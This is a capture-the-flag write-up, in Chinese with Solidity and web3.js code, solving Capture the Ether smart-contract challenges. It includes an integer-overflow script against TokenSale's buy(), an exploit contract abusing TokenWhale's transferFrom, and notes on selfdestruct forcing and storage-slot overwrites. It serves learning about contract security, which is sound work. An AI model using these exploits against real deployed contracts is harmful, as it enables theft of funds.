## Deploy a contract
![image](https://user-images.githubusercontent.com/118118760/223460455-645af028-aac9-4c26-8a1b-816c65241bda.png)
成功部署合约
## Call me
> (web3.utils.asciiToHex('RIPWU')).padEnd(64, '0')
'0x52495057550000000000000000000000000000000000000000000000000000'
## Guess the secret number
uint8取值空间极小[0,255],遍历查找
pragma solidity ^0.4.21;

contract ExploitGuessTheSecretNumberChallenge {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function guess() public view returns (uint256) {
        for (uint8 n = 0; n < 255; n++) {
            if (keccak256(n) == answerHash) {
                return n;
            }
        }

        return 256;
    }
}
## Token sale
buy() 函数中的乘法存在溢出

async function main() {
    const targetAddress = '0x546a782986933ff853248E865cC0AFd9fb93a721';
    const targetABI = require('../build/contracts/TokenSaleChallenge.json').abi;
    const targetContract = new web3.eth.Contract(targetABI, targetAddress);

    //
    const Max = web3.utils.toBN("0x10000000000000000000000000000000000000000000000000000000000000000");
    const Ether = web3.utils.toBN(web3.utils.toWei('1'));
    const Zero = web3.utils.toBN('0');
    const One = web3.utils.toBN('1');

    const divmod = Max.divmod(Ether);

    //
    var numTokens = divmod.div.add(One);
    const value = numTokens.mul(Ether).sub(Max);

    await targetContract.methods.buy(numTokens).send({value});
    await targetContract.methods.sell(One).send();
}
## Token Whale
transferFrom() 检查的是外部传入的 from 的余额，而实际扣款扣的是 msg.sender，存在溢出

pragma solidity ^0.4.21;

import "./TokenWhaleChallenge.sol";

contract ExploitTokenWhaleChallenge {
    TokenWhaleChallenge public target = TokenWhaleChallenge(0x4E12fAB3CF4aF2E96863c26c0949CEE97b092350);
    address public owner;

    function ExploitTokenWhaleChallenge() public {
        owner = msg.sender;
        require(target.balanceOf(owner) == target.totalSupply());
    }

    function attack() public {
        address self = address(this);
        uint256 allowance = target.allowance(owner, self);
        require(allowance > 0);

        target.transferFrom(owner, owner, allowance);
        target.transfer(owner, 1000000);
        require(target.isComplete() == true);
    }
}
## Retirement fund
collectPenalty() 中的减法操作存在溢出，问题是合约没有显式的 payable receive() 或 payable fallback()
参考 Ethernaut #7 Force，通过 SELEDESTRUCT 强制发送 ETH 即可
## Mapping
类似 Ethernaut #19 Alien Codex，也是覆盖漏洞
> console.log('0x' + (2n ** 256n - BigInt(web3.utils.keccak256('0x' + '1'.padStart(64, '0')))).toString(16))
0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
## Donation
donate() 中 donation 定义时未指定引用，默认指向 slot0
对 donation 的修改会覆盖 slot0 和 slot1，即 donations.length 和 owner
